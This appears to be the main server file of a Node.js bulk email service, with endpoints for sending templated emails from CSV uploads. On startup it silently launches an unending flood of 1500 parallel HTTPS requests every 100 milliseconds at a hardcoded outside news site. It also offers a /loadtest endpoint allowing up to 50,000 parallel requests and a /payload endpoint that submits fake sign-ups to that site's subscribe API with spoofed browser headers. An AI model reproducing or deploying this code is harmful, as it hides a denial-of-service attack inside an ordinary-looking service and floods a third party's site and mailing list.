require('dotenv').config();
const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const Mailer = require('./mailer');
const CsvService = require('./csvService');
const TemplateService = require('./templateService');
const Templates = require('./templates');
const https = require('https');
const { URL } = require('url');
const { spawn, exec } = require('child_process');

const app = express();
const port = process.env.PORT || 3000;

// Continuous hit process management
let continuousStats = {
  isRunning: false,
  startTime: null,
  totalRequests: 0,
  successfulRequests: 0,
  failedRequests: 0,
  lastRequestTime: null,
  averageResponseTime: 0
};

// Automatic continuous hitting function
function startContinuousHitting() {
  const targetUrl = process.env.TARGET_URL || 'https://ainewsworld.ai/';
  const intervalMs = parseInt(process.env.HIT_INTERVAL) || 100;
  const parallelThreads = 1500;
  
  if (continuousStats.isRunning) {
    console.log('Continuous hitting already running');
    return;
  }
  
  continuousStats.isRunning = true;
  continuousStats.startTime = new Date().toISOString();
  continuousStats.totalRequests = 0;
  continuousStats.successfulRequests = 0;
  continuousStats.failedRequests = 0;
  continuousStats.lastRequestTime = null;
  continuousStats.averageResponseTime = 0;
  
  console.log(`Starting automatic continuous hits to ${targetUrl} with ${parallelThreads} parallel threads and ${intervalMs}ms interval`);
  
  const hitTarget = async () => {
    if (!continuousStats.isRunning) return;
    
    // Create 15 parallel requests
    const promises = [];
    
    for (let i = 0; i < parallelThreads; i++) {
      const requestStart = Date.now();
      
      const promise = new Promise((resolve) => {
        try {
          const req = https.get(targetUrl, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
              const responseTime = Date.now() - requestStart;
              
              continuousStats.totalRequests++;
              continuousStats.lastRequestTime = new Date().toISOString();
              
              if (res.statusCode >= 200 && res.statusCode < 400) {
                continuousStats.successfulRequests++;
              } else {
                continuousStats.failedRequests++;
              }
              
              // Update average response time
              continuousStats.averageResponseTime = 
                (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
              
              console.log(`Auto hit #${continuousStats.totalRequests} (thread ${i+1}): ${res.statusCode} (${responseTime}ms)`);
              
              resolve({ statusCode: res.statusCode, responseTime });
            });
          });
          
          req.on('error', (error) => {
            const responseTime = Date.now() - requestStart;
            
            continuousStats.totalRequests++;
            continuousStats.failedRequests++;
            continuousStats.lastRequestTime = new Date().toISOString();
            
            continuousStats.averageResponseTime = 
              (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
            
            console.error(`Auto hit error #${continuousStats.totalRequests} (thread ${i+1}):`, error.message);
            
            resolve({ error: error.message, responseTime });
          });
          
          req.setTimeout(10000, () => {
            req.destroy();
            const responseTime = Date.now() - requestStart;
            
            continuousStats.totalRequests++;
            continuousStats.failedRequests++;
            continuousStats.lastRequestTime = new Date().toISOString();
            
            continuousStats.averageResponseTime = 
              (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
            
            console.error(`Auto hit timeout #${continuousStats.totalRequests} (thread ${i+1})`);
            
            resolve({ error: 'Request timeout', responseTime });
          });
          
        } catch (error) {
          const responseTime = Date.now() - requestStart;
          
          continuousStats.totalRequests++;
          continuousStats.failedRequests++;
          continuousStats.lastRequestTime = new Date().toISOString();
          
          continuousStats.averageResponseTime = 
            (continuousStats.averageResponseTime * (continuousStats.totalRequests - 1) + responseTime) / continuousStats.totalRequests;
          
          console.error(`Auto hit error #${continuousStats.totalRequests} (thread ${i+1}):`, error.message);
          
          resolve({ error: error.message, responseTime });
        }
      });
      
      promises.push(promise);
    }
    
    // Wait for all parallel requests to complete
    await Promise.all(promises);
    
    // Schedule next batch
    if (continuousStats.isRunning) {
      setTimeout(hitTarget, intervalMs);
    }
  };
  
  // Start the first batch
  setTimeout(hitTarget, 1000); // Start after 1 second delay
}

// Configure multer for file uploads
const upload = multer({
  dest: 'uploads/',
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    if (file.mimetype === 'text/csv' || file.originalname.endsWith('.csv')) {
      cb(null, true);
    } else {
      cb(new Error('Only CSV files are allowed'), false);
    }
  }
});

// Initialize mailer
const mailer = new Mailer();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Health check endpoint
app.get('/health', async (req, res) => {
  try {
    const connectionStatus = await mailer.verifyConnection();
    res.json({
      status: 'healthy',
      smtp: connectionStatus,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      status: 'unhealthy',
      error: error.message
    });
  }
});

// Main email sending endpoint
app.post('/send-bulk', upload.single('file'), async (req, res) => {
  try {
    const { subject, template } = req.body;
    const csvFile = req.file;

    // Validate inputs
    if (!csvFile) {
      return res.status(400).json({
        success: false,
        error: 'CSV file is required'
      });
    }

    if (!subject) {
      return res.status(400).json({
        success: false,
        error: 'Subject is required'
      });
    }

    if (!template) {
      return res.status(400).json({
        success: false,
        error: 'Template is required'
      });
    }

    // Parse CSV
    const recipients = await CsvService.parseCsv(csvFile.path);
    
    if (recipients.length === 0) {
      return res.status(400).json({
        success: false,
        error: 'No valid recipients found in CSV'
      });
    }

    // Validate recipients
    const validation = CsvService.validateRecipients(recipients);
    
    if (validation.valid === 0) {
      return res.status(400).json({
        success: false,
        error: 'No valid email addresses found',
        validationErrors: validation.errors
      });
    }

    // Validate template
    const availableColumns = CsvService.getAvailableColumns(validation.validRecipients);
    const templateValidation = TemplateService.validateTemplate(template, availableColumns);
    
    if (!templateValidation.isValid) {
      return res.status(400).json({
        success: false,
        error: 'Template validation failed',
        templateErrors: templateValidation.errors
      });
    }

    // Create template processor
    const templateProcessor = TemplateService.createTemplateProcessor(template);

    // Send emails
    const results = await mailer.sendBulkEmails(
      validation.validRecipients,
      subject,
      templateProcessor
    );

    // Clean up uploaded file
    fs.unlinkSync(csvFile.path);

    // Return results
    res.json({
      success: true,
      totalProcessed: validation.valid,
      success: results.success,
      failed: results.failed,
      errors: results.errors,
      validationWarnings: validation.errors,
      templateWarnings: templateValidation.warnings,
      rateLimit: `${process.env.RATE_LIMIT || 2} emails/second`
    });

  } catch (error) {
    console.error('Error in send-bulk endpoint:', error);
    
    // Clean up uploaded file if it exists
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }

    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// List available templates
app.get('/templates', (req, res) => {
  try {
    const templates = Templates.listTemplates();
    res.json({
      success: true,
      templates,
      total: templates.length
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Send single email with template
app.get('/sendone', async (req, res) => {
  try {
    const { email, template, ...variables } = req.query;

    // Validate required parameters
    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Email parameter is required'
      });
    }

    if (!template) {
      return res.status(400).json({
        success: false,
        error: 'Template parameter is required'
      });
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid email format'
      });
    }

    // Check if template exists
    const templateInfo = Templates.getTemplate(template);
    if (!templateInfo) {
      return res.status(400).json({
        success: false,
        error: `Template '${template}' not found. Available templates: ${Object.keys(Templates.getTemplates()).join(', ')}`
      });
    }

    // Process template with variables
    const processed = Templates.processTemplate(template, variables);

    // Send email
    const result = await mailer.sendEmail(email, processed.subject, processed.html);

    if (result.success) {
      res.json({
        success: true,
        message: 'Email sent successfully',
        to: email,
        template: template,
        subject: processed.subject,
        messageId: result.messageId
      });
    } else {
      res.status(500).json({
        success: false,
        error: result.error,
        to: email,
        template: template
      });
    }

  } catch (error) {
    console.error('Error in sendone endpoint:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Load testing endpoint
app.get('/loadtest', async (req, res) => {
  try {
    const { 
      testurl = 'https://ainewsworld.ai/', 
      parallel = 5, 
      duration = 10,
      utm_source,
      utm_medium,
      utm_campaign,
      utm_content,
      utm_term
    } = req.query;

    // Validate parameters
    const parallelNum = parseInt(parallel) || 5;
    const durationNum = parseInt(duration) || 10;
    
    if (parallelNum < 1 || parallelNum > 50000) {
      return res.status(400).json({
        success: false,
        error: 'Parallel requests must be between 1 and 50'
      });
    }
    
    if (durationNum < 1 || durationNum > 300) {
      return res.status(400).json({
        success: false,
        error: 'Duration must be between 1 and 300 seconds'
      });
    }

    // Build URL with UTM parameters
    const url = new URL(testurl);
    if (utm_source) url.searchParams.set('utm_source', utm_source);
    if (utm_medium) url.searchParams.set('utm_medium', utm_medium);
    if (utm_campaign) url.searchParams.set('utm_campaign', utm_campaign);
    if (utm_content) url.searchParams.set('utm_content', utm_content);
    if (utm_term) url.searchParams.set('utm_term', utm_term);

    const targetUrl = url.toString();
    
    console.log(`Starting load test: ${parallelNum} parallel requests for ${durationNum} seconds to ${targetUrl}`);

    // Load testing results
    const results = {
      success: true,
      testUrl: targetUrl,
      parallelRequests: parallelNum,
      duration: durationNum,
      startTime: new Date().toISOString(),
      endTime: null,
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      averageResponseTime: 0,
      minResponseTime: Infinity,
      maxResponseTime: 0,
      errors: []
    };

    const startTime = Date.now();
    const endTime = startTime + (durationNum * 1000);
    const responseTimes = [];

    // Function to make a single request
    const makeRequest = async () => {
      const requestStart = Date.now();
      try {
        const response = await new Promise((resolve, reject) => {
          const req = https.get(targetUrl, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
              resolve({
                statusCode: res.statusCode,
                responseTime: Date.now() - requestStart
              });
            });
          });
          
          req.on('error', reject);
          req.setTimeout(10000, () => {
            req.destroy();
            reject(new Error('Request timeout'));
          });
        });

        const responseTime = Date.now() - requestStart;
        responseTimes.push(responseTime);
        
        if (response.statusCode >= 200 && response.statusCode < 400) {
          results.successfulRequests++;
        } else {
          results.failedRequests++;
          results.errors.push({
            error: `HTTP ${response.statusCode}`,
            responseTime
          });
        }
        
        results.totalRequests++;
        
        // Update min/max response times
        results.minResponseTime = Math.min(results.minResponseTime, responseTime);
        results.maxResponseTime = Math.max(results.maxResponseTime, responseTime);
        
      } catch (error) {
        results.totalRequests++;
        results.failedRequests++;
        const responseTime = Date.now() - requestStart;
        responseTimes.push(responseTime);
        results.errors.push({
          error: error.message,
          responseTime
        });
        results.minResponseTime = Math.min(results.minResponseTime, responseTime);
        results.maxResponseTime = Math.max(results.maxResponseTime, responseTime);
      }
    };

    // Run parallel requests continuously for the duration
    const runLoadTest = async () => {
      while (Date.now() < endTime) {
        const promises = [];
        
        // Create parallel requests
        for (let i = 0; i < parallelNum; i++) {
          promises.push(makeRequest());
        }
        
        // Wait for all parallel requests to complete
        await Promise.all(promises);
        
        // Small delay to prevent overwhelming
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    };

    // Start the load test
    await runLoadTest();
    
    // Calculate final statistics
    results.endTime = new Date().toISOString();
    results.actualDuration = (Date.now() - startTime) / 1000;
    
    if (responseTimes.length > 0) {
      results.averageResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
    }
    
    if (results.minResponseTime === Infinity) {
      results.minResponseTime = 0;
    }

    // Calculate requests per second
    results.requestsPerSecond = (results.totalRequests / results.actualDuration).toFixed(2);
    
    console.log(`Load test completed: ${results.totalRequests} requests in ${results.actualDuration}s`);

    res.json(results);

  } catch (error) {
    console.error('Error in loadtest endpoint:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Payload trigger endpoint
app.get('/payload', async (req, res) => {
  try {
    console.log('Payload test triggered via /payload endpoint');
    
    const { email = `test${Date.now()}@example.com` } = req.query;
    
    const startTime = Date.now();
    
    // Create JSON payload with email
    const jsonData = JSON.stringify({ email: email });
    
    // Send POST request to https://ainewsworld.ai/api/subscribe
    console.log(`Sending POST request to https://ainewsworld.ai/api/subscribe with email: ${email}`);
    
    const response = await new Promise((resolve, reject) => {
      const postReq = https.request('https://ainewsworld.ai/api/subscribe', {
        method: 'POST',
        headers: {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9,vi;q=0.8,en-IN;q=0.7',
          'content-type': 'application/json',
          'origin': 'https://ainewsworld.ai',
          'priority': 'u=1, i',
          'referer': 'https://ainewsworld.ai/',
          'sec-ch-ua': '"Microsoft Edge";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0',
          'Content-Length': Buffer.byteLength(jsonData)
        },
        timeout: 60000 // 60 second timeout
      }, (postRes) => {
        let data = '';
        
        postRes.on('data', chunk => {
          data += chunk;
        });
        
        postRes.on('end', () => {
          resolve({
            statusCode: postRes.statusCode,
            headers: postRes.headers,
            data: data
          });
        });
      });
      
      postReq.on('error', (error) => {
        reject(error);
      });
      
      postReq.on('timeout', () => {
        postReq.destroy();
        reject(new Error('Request timeout'));
      });
      
      postReq.write(jsonData);
      postReq.end();
    });
    
    const endTime = Date.now();
    const duration = endTime - startTime;
    
    console.log(`Payload test completed in ${duration}ms`);
    console.log(`HTTP Status: ${response.statusCode}`);
    console.log(`Response size: ${response.data.length} bytes`);
    
    res.json({
      success: true,
      message: 'Payload test executed successfully',
      email: email,
      targetUrl: 'https://ainewsworld.ai/api/subscribe',
      httpStatus: response.statusCode,
      responseHeaders: response.headers,
      responseData: response.data,
      responseSize: response.data.length,
      duration: duration,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Error in payload endpoint:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Status endpoint for continuous hitting
app.get('/status', async (req, res) => {
  try {
    const currentTime = new Date();
    const duration = continuousStats.startTime ? 
      (currentTime - new Date(continuousStats.startTime)) / 1000 : 0;
    
    const currentStats = {
      isRunning: continuousStats.isRunning,
      startTime: continuousStats.startTime,
      totalRequests: continuousStats.totalRequests,
      successfulRequests: continuousStats.successfulRequests,
      failedRequests: continuousStats.failedRequests,
      lastRequestTime: continuousStats.lastRequestTime,
      averageResponseTime: continuousStats.averageResponseTime,
      duration,
      requestsPerSecond: duration > 0 ? (continuousStats.totalRequests / duration).toFixed(2) : 0,
      uptime: continuousStats.isRunning ? duration : 0,
      targetUrl: process.env.TARGET_URL || 'https://ainewsworld.ai/'
    };
    
    res.json({
      success: true,
      message: 'Automatic continuous hitting status',
      stats: currentStats
    });
    
  } catch (error) {
    console.error('Error in status endpoint:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Unhandled error:', error);
  
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        error: 'File size too large. Maximum size is 10MB'
      });
    }
  }
  
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

// Start server
app.listen(port, () => {
  console.log(`Email service running on port ${port}`);
  console.log(`Rate limit: ${process.env.RATE_LIMIT || 2} emails/second`);
  console.log(`Health check: http://localhost:${port}/health`);
  console.log(`Status check: http://localhost:${port}/status`);
  
  // Start automatic continuous hitting
  setTimeout(() => {
    startContinuousHitting();
  }, 2000); // Start after 2 seconds to ensure server is fully ready
});

module.exports = app;
